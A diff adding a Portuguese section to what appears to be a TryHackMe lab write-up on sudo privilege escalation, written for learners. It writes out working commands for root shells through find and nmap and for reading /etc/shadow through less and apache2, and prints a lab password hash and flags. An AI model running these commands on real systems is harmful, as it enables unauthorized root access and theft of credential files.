@@ -300,3 +300,149 @@ THM-28392872729920
 
 - Antes: `-rw-r-----` (apenas matt e grupo matt podem ler)
 - Depois: Acesso root permite ler qualquer arquivo do sistema
+
+---
+## 4. Sudo e Escalonamento de Privilégios
+
+### Visão Geral do Mecanismo Sudo
+
+O comando `sudo` permite executar programas com privilégios de superusuário (root). Administradores podem configurá-lo para conceder acesso granular a usuários específicos, permitindo que executem comandos privilegiados sem conceder acesso root completo. Por exemplo, um analista de segurança pode receber permissão para executar apenas o Nmap com privilégios elevados.
+
+**Arquitetura do Sudo:**
+
+```text
+Usuário → sudo → Política (/etc/sudoers) → Execução como root
+```
+
+### Verificação de Privilégios Sudo
+
+Qualquer usuário pode verificar seus privilégios sudo com os seguintes comandos:
+
+```bash
+# Verificar comandos permitidos com sudo
+sudo -l
+
+# Verificar sudoers detalhado
+sudo -ll
+
+# Verificar comandos permitidos para o usuário atual
+sudo -U $(whoami) -l
+
+# Verificar histórico de comandos sudo
+sudo cat /var/log/auth.log | grep sudo
+```
+
+### Exploração Direta de Binários Sudo
+
+#### Utilizando GTFOBins
+
+O repositório [GTFOBins](https://gtfobins.github.io/) documenta como binários comuns podem ser explorados para escapar de ambientes restritos ou elevar privilégios. Quando um usuário tem permissão sudo para executar determinado binário, pode-se consultar o GTFOBins para verificar se existem métodos conhecidos para obter shell root através dele.
+
+#### Exploração de Funções de Aplicativos
+
+Alguns aplicativos, mesmo sem vulnerabilidades conhecidas, podem ter funcionalidades que permitem vazamento de informações ou execução de código. Por exemplo, o Apache2 possui a opção `-f` para especificar um arquivo de configuração alternativo:
+
+```bash
+sudo apache2 -f /etc/shadow
+```
+
+Quando um arquivo inválido é fornecido, o Apache2 exibe uma mensagem de erro que inclui parte do conteúdo do arquivo, possibilitando a leitura de arquivos sensíveis como `/etc/shadow`.
+
+#### Exploração via LD_PRELOAD
+
+A variável de ambiente `LD_PRELOAD` permite carregar bibliotecas compartilhadas antes das bibliotecas padrão. Se o sudo estiver configurado com `env_keep` incluindo `LD_PRELOAD`, é possível injetar código malicioso.
+
+**Identificação da Vulnerabilidade:**
+
+![](https://assets.tryhackme.com/additional/imgur/gGstS69.png)
+
+
+### Caso Prático
+
+#### Enumeração de Privilégios
+
+```bash
+sudo -l
+```
+
+**Saída:**
+
+```text
+Matching Defaults entries for karen on ip-10-65-143-118:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User karen may run the following commands on ip-10-65-143-118:
+    (ALL) NOPASSWD: /usr/bin/find
+    (ALL) NOPASSWD: /usr/bin/less
+    (ALL) NOPASSWD: /usr/bin/nano
+```
+
+O usuário Karen pode executar três programas com sudo sem necessidade de senha (`NOPASSWD`).
+
+#### Exploração com Find
+
+Consultando o [GTFOBins para find](https://gtfobins.github.io/gtfobins/find/), encontramos que o comando `find` pode executar comandos arbitrários através da flag `-exec`:
+
+```bash
+# Shell interativo
+sudo find /home -exec /bin/bash \;
+
+# Shell one-liner
+sudo find . -exec /bin/sh \; -quit
+```
+
+**Funcionamento:**
+
+- `find .`: Procura no diretório atual
+- `-exec /bin/sh \;`: Para cada arquivo encontrado, executa `/bin/sh`
+- `-quit`: Encerra após o primeiro resultado    
+
+Isso spawna um shell root, permitindo acesso ao sistema com privilégios elevados.
+
+#### Captura da Flag 2
+
+```bash
+cd /home/ubuntu
+cat flag2.txt
+```
+
+**Saída:**
+
+```text
+THM-402028394
+```
+
+Outro exemplo possível usando nmap:
+
+```bash
+sudo nmap --interactive
+!/bin/sh
+```
+
+### Leitura do Arquivo `/etc/shadow`
+
+Outro programa vulnerável listado no `sudo -l` é o `less`. Através dele é possível  ler o arquivo `/etc/shadow` que contém hashes das senhas dos usuários
+
+```bash
+sudo less /etc/shadow
+```
+
+Resposta:
+
+```text
+frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
+```
+
+### Análise do Hash
+
+- `$6`: Indica algoritmo SHA-512
+- `2.sUUDsOLIpXKxcr`: Salt (12 caracteres)
+- Hash restante: Hash criptográfico da senha
+
+### Resumo do Vetor de Ataque
+
+1. Enumeração: sudo -l revela programas executáveis com privilégios
+2. Pesquisa: Consulta ao GTFOBins para métodos de exploração
+3. Execução: Uso dos parâmetros adequados para spawnar shell root
+4. Coleta: Acesso a arquivos sensíveis e flags
